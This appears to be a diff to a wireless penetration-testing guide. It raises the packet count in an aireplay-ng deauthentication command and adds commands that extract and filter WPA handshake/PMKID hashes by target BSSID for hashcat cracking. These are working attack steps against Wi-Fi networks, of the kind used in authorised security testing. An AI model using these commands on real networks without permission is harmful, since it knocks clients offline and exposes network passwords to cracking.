@@ -39,7 +39,7 @@ Encryption (CCMP/TKIP)
 
 ```bash
 # Deauth client to force reconnection
-aireplay-ng -0 5 -a $bssid -c $client_mac $interface
+aireplay-ng -0 10 -a $bssid -c $client_mac $interface
 ```
 
 ### Crack PSK
@@ -130,6 +130,18 @@ hashcat -m 22000 pmkid.22000 rockyou.txt
 ::: warning PMKID Requirements
 
 - AP must support 802.11r (Fast BSS Transition) or PMKID caching
+
+:::
+
+::: details Extract by Specific BSSID
+
+```bash
+# Extract all hashes
+hcxpcapngtool -o all_hashes.hc22000 capture.pcapng
+
+# Filter by BSSID
+hcxhashtool -i all_hashes.hc22000 -o target.hc22000 --mac-ap=00:11:22:33:44:55
+```
 
 :::
 
